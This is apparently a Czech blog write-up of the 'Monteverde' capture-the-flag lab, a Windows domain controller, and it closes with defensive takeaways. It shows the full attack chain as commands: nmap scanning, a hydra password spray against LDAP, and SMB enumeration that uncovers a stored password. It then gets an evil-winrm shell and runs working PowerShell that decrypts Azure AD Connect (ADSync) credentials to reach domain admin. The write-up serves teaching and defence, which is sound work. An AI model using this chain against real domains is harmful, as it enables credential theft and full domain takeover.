---
layout: post
author: Tomáš Matějíček
title: "Monteverde"
date: 2020-12-17
tags: windows kerberos ldap winrm active-directory
---
## Úvod a kontext

Monteverde je výborný příklad Active Directory stroje, kde se foothold neotevře exploitací služby, ale chybnou prací s hesly a tajemstvími. První krok je jednoduchý password spray proti LDAP. Druhý krok vede přes soubor `azure.xml` uložený v cizím domovském adresáři. Root, respektive doménový admin, pak přichází přes Azure AD Connect a lokálně uložené synchronizační tajemství.

Právě poslední část je na Monteverde nejzajímavější. Administrátor neprohrává kvůli kernel exploitu, ale proto, že na serveru běží ADSync s dešifrovatelnými přístupovými údaji k doméně.

## Počáteční průzkum

### Typický Domain Controller

`nmap` dává okamžitě jasný obrázek: Kerberos, LDAP, SMB, WinRM a další služby typické pro Domain Controller. V takové situaci dává smysl soustředit se na účty a sdílení, ne na webový exploit, protože web tu vůbec není.
```bash
ports=$(nmap -Pn -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);nmap -Pn -p $ports -A -sC -sV -v $IP
```
```text
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49702,49771
PORT      STATE SERVICE       VERSION
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        .NET Message Framing
```

### Seznam účtů a password spray

Jakmile je jasné, že jde o AD, je rozumné si nejdřív vytáhnout seznam uživatelů a zkusit velmi úzký password spray. Na Monteverde funguje varianta `username == password` pro účet `SABatchJobs`, což je přesně ten typ provozního zjednodušení, který v doméně otevírá další enumeraci.
```text
GetADUsers.py -all MEGABANK.LOCAL/
=> mhope
=> SABatchJobs
=> svc-ata
=> svc-bexec
=> svc-netapp

hydra -L Monteverde-users.txt -P Monteverde-users.txt $IP ldap2 -I
=> [389][ldap2] host: 10.10.10.172   login: SABatchJobs   password: SABatchJobs
```

S těmito údaji už jde systematicky procházet SMB sdílení a hledat cizí konfigurace nebo exporty.
```bash
./enum4linux.pl -a -d -o -v -u SABatchJobs -p SABatchJobs $IP > Monteverde-enum4linux.txt
```
```text
=> home$/mhope/azure.xml: 4n0therD4y@n0th3r$
```

## Získání přístupu

### WinRM jako `mhope`

Soubor `azure.xml` obsahuje heslo účtu `mhope` a právě ten se hodí pro WinRM. Tím se z read-only přístupu do SMB stává skutečný shell na serveru.
```bash
./evil-winrm/evil-winrm.rb -i $IP -u mhope -p "4n0therD4y@n0th3r$"
```

### Získání user flagu

Na účtu `mhope` už lze normálně pokračovat lokální enumerací a potvrdit foothold přes `user.txt`.
```text
cat user.txt
__CENSORED__
```

## Eskalace oprávnění

### Azure AD Connect a dešifrování ADSync hesla

Na účtu `mhope` je klíčové nevěnovat se jen běžným službám, ale zkontrolovat nainstalovaný software. Monteverde má Azure AD Connect a lokální SQL Server, což je velmi silná stopa. ADSync si musí někam ukládat synchronizační tajemství a na hostu jsou k tomu všechny potřebné komponenty včetně `mcrypt.dll`.

Postup je pak přímočarý: z databáze `ADSync` se vytáhne `entropy`, `instance_id`, `keyset_id` a zašifrovaná konfigurace, pomocí `mcrypt.dll` se obsah dešifruje a z XML vypadnou doménové přihlašovací údaje.
```powershell
$mms_server_configuration = Invoke-Sqlcmd -Query "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration" -ServerInstance "tcp:monteverde,1433" -Database "ADSync"
$mms_management_agent = Invoke-Sqlcmd -Query "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'" -ServerInstance "tcp:monteverde,1433" -Database "ADSync"

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($mms_server_configuration.entropy, $mms_server_configuration.instance_id, $mms_server_configuration.keyset_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$decrypted = $null
$key.DecryptBase64ToString($mms_management_agent.encrypted_configuration, [ref]$decrypted)
```

Výsledek je účet `administrator` s heslem `d0m@in4dminyeah!`, takže finální krok je už jen nové přihlášení přes WinRM.
```bash
./evil-winrm/evil-winrm.rb -i $IP -u administrator -p "d0m@in4dminyeah!"
gc root.txt
```
```text
__CENSORED__
```

## Shrnutí klíčových poznatků

- Foothold na Monteverde nezačal exploitem, ale úspěšným password sprayem proti LDAP a následným průchodem SMB sdílení.
- Nejdůležitějším artefaktem pro user část byl `azure.xml` v domovském adresáři `mhope`, tedy čistý únik tajemství mezi účty.
- Root část nestojí na reuse běžného hesla, ale na tom, že Azure AD Connect ukládá dešifrovatelné synchronizační údaje přímo na serveru.

## Co si odnést do praxe

- Password spray s malým rozsahem bývá v AD pořád účinnější než složité exploity. Obrana stojí na silných heslech, lockout policy a kontrole účtů typu `username == password`.
- Konfigurační soubory jako `azure.xml` nesmějí ležet v uživatelských profilech nebo sdíleních dostupných jiným účtům. Jediný takový soubor může otevřít WinRM nebo jiný vzdálený management.
- Servery s Azure AD Connect je potřeba chránit jako vysoce citlivé systémy. Kdo získá lokální přístup k ADSync hostu, může často obnovit i doménová synchronizační tajemství.
